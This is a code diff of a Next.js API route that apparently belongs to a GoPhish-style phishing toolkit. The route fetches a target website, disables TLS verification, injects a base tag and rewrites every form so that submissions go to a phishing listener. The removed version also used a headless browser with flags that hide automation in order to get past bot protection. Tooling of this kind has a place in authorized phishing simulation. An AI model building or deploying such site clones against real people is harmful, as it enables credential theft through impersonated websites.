@@ -1,161 +1,160 @@
 import { NextResponse } from "next/server";
 import { readSessionCookie, verifySession } from "@/lib/session";
-import { execFile } from "node:child_process";
-import { promisify } from "node:util";
-import fs from "node:fs";
+import http from "node:http";
+import https from "node:https";
 
-const execFileAsync = promisify(execFile);
+function fetchTargetSite(targetUrl: string, maxRedirects = 10): Promise<{ finalUrl: string; html: string }> {
+  return new Promise((resolve, reject) => {
+    function requestHop(currentUrl: string, hops: number) {
+      if (hops > maxRedirects) {
+        return reject(new Error("Terlalu banyak redirect (max 10)."));
+      }
 
-function getEdgePath(): string | null {
-  const paths = [
-    "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
-    "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
-  ];
-  for (const p of paths) {
-    if (fs.existsSync(p)) return p;
-  }
-  return null;
-}
+      let parsed: URL;
+      try {
+        parsed = new URL(currentUrl);
+      } catch {
+        return reject(new Error("URL tidak valid."));
+      }
 
-function checkWafBlock(html: string): string | null {
-  if (!html) return null;
-  const lower = html.toLowerCase();
-  if (
-    lower.includes("_incapsula_resource") ||
-    lower.includes("incapsula incident id") ||
-    lower.includes("request unsuccessful. incapsula") ||
-    lower.includes("incap_ses")
-  ) {
-    return "Imperva Incapsula WAF";
-  }
-  if (
-    lower.includes("cf-browser-verification") ||
-    lower.includes("just a moment...") ||
-    lower.includes("attention required! | cloudflare") ||
-    (lower.includes("cloudflare") && lower.includes("ray id:"))
-  ) {
-    return "Cloudflare Bot Protection";
-  }
-  if (lower.includes("datadome") || lower.includes("perimeterx")) {
-    return "Anti-Bot Protection";
-  }
-  return null;
-}
+      const isHttps = parsed.protocol === "https:";
+      const mod = isHttps ? https : http;
 
-async function renderWithHeadlessBrowser(url: string): Promise<string | null> {
-  const edge = getEdgePath();
-  if (!edge) return null;
-  try {
-    const { stdout } = await execFileAsync(
-      edge,
-      [
-        "--headless=new",
-        "--disable-gpu",
-        "--dump-dom",
-        "--disable-blink-features=AutomationControlled",
-        "--window-size=1920,1080",
-        "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-        url,
-      ],
-      { maxBuffer: 15 * 1024 * 1024, timeout: 20000 }
-    );
-    if (stdout && stdout.length > 500) {
-      return stdout;
+      const options = {
+        protocol: parsed.protocol,
+        hostname: parsed.hostname,
+        port: parsed.port || (isHttps ? 443 : 80),
+        path: parsed.pathname + parsed.search,
+        method: "GET",
+        headers: {
+          "User-Agent":
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+          "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+        },
+        rejectUnauthorized: false, // GoPhish behavior: InsecureSkipVerify = true
+      };
+
+      const req = mod.request(options, (res) => {
+        // Follow redirects (301, 302, 303, 307, 308)
+        if ([301, 302, 303, 307, 308].includes(res.statusCode || 0) && res.headers.location) {
+          try {
+            const nextUrl = new URL(res.headers.location, currentUrl).href;
+            return requestHop(nextUrl, hops + 1);
+          } catch {
+            // If location is unparseable, continue reading body
+          }
+        }
+
+        let body = "";
+        res.setEncoding("utf8");
+        res.on("data", (chunk) => {
+          body += chunk;
+        });
+        res.on("end", () => {
+          if (!body || body.trim().length === 0) {
+            return reject(new Error("Halaman website kosong atau tidak dapat diakses."));
+          }
+          resolve({ finalUrl: currentUrl, html: body });
+        });
+      });
+
+      req.on("error", (err) => {
+        reject(new Error(`Gagal menghubungi server target: ${err.message}`));
+      });
+
+      req.setTimeout(15000, () => {
+        req.destroy(new Error("Koneksi timeout setelah 15 detik."));
+      });
+
+      req.end();
     }
-  } catch (e) {
-    console.warn("Headless browser render failed:", e);
+
+    requestHop(targetUrl, 0);
+  });
+}
+
+function transformGophish(html: string, siteUrl: string): string {
+  let result = html;
+
+  // 1. Insert <base href="%s"> at the beginning of <head> if not already present
+  if (!/<base\b/i.test(result)) {
+    const baseTag = `<base href="${siteUrl}"/>`;
+    if (/<head[^>]*>/i.test(result)) {
+      result = result.replace(/<head[^>]*>/i, (match) => `${match}\n\t${baseTag}`);
+    } else {
+      result = `${baseTag}\n${result}`;
+    }
   }
-  return null;
+
+  // 2. GoPhish Form logic:
+  // For each <form>, find the original action, prepend <input type="hidden" name="__original_url" value="..."/>
+  // and set action="" so the form will submit to phishing listener
+  result = result.replace(/<form\b([\s\S]*?)>/gi, (formTag, inside) => {
+    // Extract existing action
+    const actionMatch = inside.match(/action=["']([^"']*)["']/i);
+    let origUrl = actionMatch ? actionMatch[1].trim() : siteUrl;
+
+    if (!origUrl) {
+      origUrl = siteUrl;
+    } else if (!origUrl.startsWith("http://") && !origUrl.startsWith("https://")) {
+      try {
+        origUrl = new URL(origUrl, siteUrl).href;
+      } catch {
+        origUrl = siteUrl;
+      }
+    }
+
+    const hiddenField = `<input type="hidden" name="__original_url" value="${origUrl.replace(/"/g, "&quot;")}"/>`;
+
+    // Rewrite action to empty string "" (standard GoPhish template)
+    let newInside = inside;
+    if (actionMatch) {
+      newInside = inside.replace(/action=["'][^"']*["']/i, 'action=""');
+    } else {
+      newInside = `${inside} action=""`;
+    }
+
+    return `<form${newInside}>\n\t${hiddenField}`;
+  });
+
+  return result;
 }
 
 export async function POST(req: Request) {
   const token = readSessionCookie(req.headers.get("cookie"));
-  if (!token || !verifySession(token)) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
+  if (!token || !verifySession(token)) {
+    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
+  }
 
   const body = await req.json().catch(() => null);
-  const raw = typeof body?.url === "string" ? body.url.trim() : "";
+  const rawUrl = typeof body?.url === "string" ? body.url.trim() : "";
+
+  if (!rawUrl) {
+    return NextResponse.json({ error: "No URL Specified!" }, { status: 400 });
+  }
+
   let parsed: URL;
   try {
-    parsed = new URL(raw);
+    parsed = new URL(rawUrl);
   } catch {
     return NextResponse.json({ error: "Enter a valid http(s) URL." }, { status: 400 });
   }
-  if (parsed.protocol !== "http:" && parsed.protocol !== "https:")
-    return NextResponse.json({ error: "Enter a valid http(s) URL." }, { status: 400 });
 
-  let html = "";
-  let needsHeadless = false;
+  if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
+    return NextResponse.json({ error: "Enter a valid http(s) URL." }, { status: 400 });
+  }
 
   try {
-    const res = await fetch(parsed.toString(), {
-      signal: AbortSignal.timeout(10000),
-      headers: {
-        "User-Agent":
-          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-      },
+    const { finalUrl, html } = await fetchTargetSite(parsed.toString());
+    const transformedHtml = transformGophish(html, finalUrl);
+
+    return NextResponse.json({
+      html: transformedHtml,
+      redirectUrl: finalUrl,
     });
-
-    if (res.ok) {
-      html = await res.text();
-      // Check if it's an empty client-rendered SPA or challenge page
-      const wafName = checkWafBlock(html);
-      const hasFormOrInput = /<form\b|<input\b/i.test(html);
-      if (wafName || !hasFormOrInput || html.length < 2000) {
-        needsHeadless = true;
-      }
-    } else {
-      needsHeadless = true;
-    }
-  } catch {
-    needsHeadless = true;
+  } catch (err: unknown) {
+    const message = err instanceof Error ? err.message : "Gagal meng-import website.";
+    return NextResponse.json({ error: message }, { status: 400 });
   }
-
-  // If initial fetch is an SPA shell or failed/challenged, render full DOM via headless Edge
-  if (needsHeadless || !html.trim()) {
-    const rendered = await renderWithHeadlessBrowser(parsed.toString());
-    if (rendered && rendered.trim()) {
-      html = rendered;
-    }
-  }
-
-  // Check if target is explicitly blocked by WAF/Anti-Bot challenge
-  const detectedWaf = checkWafBlock(html);
-  if (detectedWaf) {
-    return NextResponse.json(
-      {
-        error: `Website (${parsed.hostname}) dilindungi oleh sistem Anti-Bot / WAF (${detectedWaf}). Server otomatis diblokir saat mencoba mengambil source secara langsung. Solusi: Buka ${parsed.href} di browser Anda, tekan Ctrl+U (View Page Source), Copy kodenya, lalu Paste langsung ke tab "Source HTML".`,
-      },
-      { status: 422 }
-    );
-  }
-
-  if (!html.trim()) {
-    return NextResponse.json({ error: "Gagal meng-clone website dari URL yang dimasukkan." }, { status: 400 });
-  }
-
-  // 1. Inject <base href="..."> into <head> so all relative CSS, images, and fonts load properly
-  if (!/<base\s/i.test(html)) {
-    const baseTag = `<base href="${parsed.origin}/">`;
-    if (/<head[^>]*>/i.test(html)) {
-      html = html.replace(/<head[^>]*>/i, (match) => `${match}\n  ${baseTag}`);
-    } else {
-      html = `${baseTag}\n${html}`;
-    }
-  }
-
-  // 2. Rewrite form actions to empty string "" (GoPhish standard behavior)
-  html = html.replace(/<form\b([^>]*?)action=["'][^"']*["']/gi, '<form$1action=""');
-
-  // 3. Strip client-side SPA scripts and hydration bundles (Next.js/React/Vue/Webpack)
-  // These scripts cause "Terjadi kesalahan pada sisi client" hydration crashes, anti-iframe busting,
-  // and interfere with native form submission in phishing templates.
-  html = html.replace(/<script\b[\s\S]*?<\/script>/gi, "");
-  html = html.replace(/<noscript\b[\s\S]*?<\/noscript>/gi, "");
-
-  return NextResponse.json({
-    html,
-    redirectUrl: parsed.href,
-  });
 }
